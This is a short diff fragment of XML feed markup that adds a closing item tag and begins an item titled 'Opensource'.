+        </item>
         
         <item>
             <title>Opensource</title>
